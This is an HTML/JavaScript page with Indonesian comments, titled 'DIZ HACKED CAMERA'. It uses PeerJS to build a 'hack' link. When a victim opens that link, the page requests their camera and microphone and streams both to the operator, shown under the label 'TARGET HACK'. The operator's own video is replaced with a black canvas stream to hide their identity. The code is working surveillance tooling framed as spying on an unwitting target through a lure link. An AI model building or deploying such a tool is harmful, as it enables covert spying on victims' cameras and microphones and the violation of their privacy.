<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>DIZ HACKED CAMERA</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    html, body{width:100%;height:100%;overflow-x:hidden;overflow-y:auto}
    body{font-family:'Roboto',sans-serif;background:#000;color:#fff}
    .wrapper{
      max-width:480px;
      margin:20px auto;
      background:rgba(0,0,0,0.85);
      border:2px solid #0ff;
      border-radius:10px;
      box-shadow:0 0 20px #0ff;
      overflow:hidden
    }
    .header{
      background:linear-gradient(45deg,#0ff,#f0f);
      padding:15px;
      text-align:center;
      font-size:20px;
      font-weight:bold;
      text-shadow:0 0 5px #fff;
      position:relative
    }
    .fullscreen-toggle{
      position:absolute;
      right:15px;
      top:15px;
      background:transparent;
      border:none;
      color:#fff;
      font-size:16px;
      cursor:pointer;
      text-shadow:0 0 5px #fff
    }
    .content{padding:10px}
    .video-container{
      display:flex;
      justify-content:center;
      align-items:center;
      margin-bottom:10px
    }
    /* Hanya menyisakan kolom target */
    .video-column{flex:1;text-align:center}
    .video-wrapper{
      position:relative;
      border:2px solid #0ff;
      border-radius:10px;
      overflow:hidden;
      box-shadow:0 0 10px #0ff
    }
    video{
      width:100%;
      height:auto;
      display:block;
      background:#000
    }
    .video-label{
      position:absolute;
      bottom:5px;
      left:5px;
      background:rgba(0,0,0,0.5);
      padding:5px 10px;
      border-radius:5px;
      font-size:14px;
      font-weight:bold;
      text-shadow:0 0 3px #000
    }
    .controls{
      text-align:center;
      margin-top:10px
    }
    .btn{
      padding:10px 20px;
      border:none;
      border-radius:100px;
      font-size:16px;
      cursor:pointer;
      margin:5px;
      transition:all 0.3s;
      text-shadow:0 0 3px #000
    }
    .btn-start{
      background:#25d366;
      color:#fff;
      box-shadow:0 0 10px #25d366
    }
    .btn-start:hover{transform:scale(1.05)}
    .btn-end{
      background:#d32f2f;
      color:#fff;
      box-shadow:0 0 10px #d32f2f
    }
    .btn-end:hover{transform:scale(1.05)}
    .link-container{
      display:flex;
      align-items:center;
      gap:10px;
      justify-content:center;
      margin-top:10px
    }
    .link-input{
      flex:1;
      padding:8px 12px;
      border:1px solid #0ff;
      border-radius:25px;
      background:#000;
      color:#0ff;
      text-align:center;
      font-size:14px
    }
    .btn-copy{
      background:#075e54;
      color:#fff;
      box-shadow:0 0 0px #075e54;
      border-radius:10px
    }
    .btn-copy:hover{transform:scale(1.1)}
  </style>
</head>
<body>
  <div class="wrapper" id="appContainer">
    <div class="header">
      DIZ FLYZE HACKED
      <button class="fullscreen-toggle" id="fullscreenToggle">[<>]</button>
    </div>
    <div class="content">
      <div class="video-container">
        <!-- Hanya kolom target yang ditampilkan -->
        <div class="video-column remote-column">
          <div class="video-wrapper">
            <video id="remoteVideo" autoplay playsinline></video>
            <div class="video-label">TARGET HACK</div>
          </div>
        </div>
      </div>
      <div class="controls">
        <button id="startCallBtn" class="btn btn-start">HACK</button>
        <button id="endCallBtn" class="btn btn-end" style="display: none;">CLOSED</button>
        <div class="link-container">
          <input type="text" id="callLink" class="link-input" readonly placeholder="LINK HACK">
          <button id="copyLinkBtn" class="btn btn-copy">âž¤</button>
        </div>
      </div>
    </div>
  </div>
  
  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
  <script>
    // Fungsi untuk membuat stream video hitam dari stream asli
    function createBlackVideoStream(originalStream) {
      // Ambil track video asli
      const videoTrack = originalStream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      const width = settings.width || 640;
      const height = settings.height || 480;
      // Buat elemen canvas dengan ukuran yang sama
      const canvas = document.createElement('canvas');
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d');
      // Fungsi untuk menggambar hitam secara terus-menerus di canvas
      function draw() {
        ctx.fillStyle = 'black';
        ctx.fillRect(0, 0, width, height);
        requestAnimationFrame(draw);
      }
      draw();
      // Ambil stream dari canvas (misalnya 30 frame per detik)
      const blackStream = canvas.captureStream(30);
      const blackVideoTrack = blackStream.getVideoTracks()[0];
      // Gabungkan track video hitam dengan track audio asli
      const newStream = new MediaStream();
      newStream.addTrack(blackVideoTrack);
      originalStream.getAudioTracks().forEach(track => newStream.addTrack(track));
      return newStream;
    }

    function getQueryParam(param) {
      const params = new URLSearchParams(window.location.search);
      return params.get(param);
    }
    let peer = null, localStream = null, currentCall = null;

    function getLiveStream() {
      return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    }
    
    // Mode Admin: Stream lokal diambil, namun video yang dikirim ke target
    // telah dimodifikasi menjadi hitam (seolah-olah kamera tertutup kain).
    function initAdmin() {
      document.getElementById('startCallBtn').style.display = 'none';
      document.getElementById('endCallBtn').style.display = 'inline-block';
      getLiveStream().then(stream => {
        localStream = stream;
        // Tidak menampilkan preview lokal (elemen lokal dihilangkan)
        // Buat stream yang telah dimodifikasi (video hitam)
        const modifiedStream = createBlackVideoStream(stream);
        peer = new Peer();
        peer.on('open', function(id) {
          const link = window.location.origin + window.location.pathname + '?peer=' + id;
          document.getElementById('callLink').value = link;
        });
        peer.on('call', function(call) {
          currentCall = call;
          // Jawab panggilan dengan stream yang sudah dimodifikasi
          call.answer(modifiedStream);
          call.on('stream', function(remoteStream) {
            document.getElementById('remoteVideo').srcObject = remoteStream;
          });
        });
      }).catch(err => {
        alert('Error accessing camera/microphone: ' + err);
      });
      document.getElementById('endCallBtn').addEventListener('click', endCall);
      document.getElementById('copyLinkBtn').addEventListener('click', function() {
        const input = document.getElementById('callLink');
        input.select();
        document.execCommand('copy');
        alert('Link copied!');
      });
    }
    
    // Mode Guest: Pada mode ini, guest mengirimkan stream aslinya.
    // Jika diinginkan, guest juga dapat memodifikasi stream-nya dengan cara yang sama.
    function initGuest(adminId) {
      document.getElementById('startCallBtn').style.display = 'none';
      document.getElementById('endCallBtn').style.display = 'inline-block';
      getLiveStream().then(stream => {
        localStream = stream;
        peer = new Peer();
        peer.on('open', function(id) {
          // Jika guest juga ingin mengirim video hitam, gunakan:
          // const modifiedStream = createBlackVideoStream(stream);
          // const call = peer.call(adminId, modifiedStream);
          const call = peer.call(adminId, stream);
          currentCall = call;
          call.on('stream', function(remoteStream) {
            document.getElementById('remoteVideo').srcObject = remoteStream;
          });
        });
      }).catch(err => {
        alert('Error accessing camera/microphone: ' + err);
      });
      document.getElementById('endCallBtn').addEventListener('click', endCall);
    }
    
    function endCall() {
      if (currentCall) currentCall.close();
      if (peer) peer.destroy();
      if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
      }
      window.location.reload();
    }
    
    window.addEventListener('load', function() {
      const adminPeerId = getQueryParam('peer');
      if (adminPeerId) {
        initGuest(adminPeerId);
      } else {
        document.getElementById('startCallBtn').addEventListener('click', initAdmin);
      }
    });
    
    // Fullscreen Toggle Menggunakan Fullscreen API
    const fullscreenToggle = document.getElementById('fullscreenToggle');
    const appContainer = document.getElementById('appContainer');
    fullscreenToggle.addEventListener('click', function() {
      if (!document.fullscreenElement) {
        appContainer.requestFullscreen().catch(err => {
          alert(`Error enabling full-screen mode: ${err.message}`);
        });
        fullscreenToggle.textContent = '<>';
      } else {
        document.exitFullscreen();
        fullscreenToggle.textContent = '<>';
      }
    });
  </script>
</body>
</html>
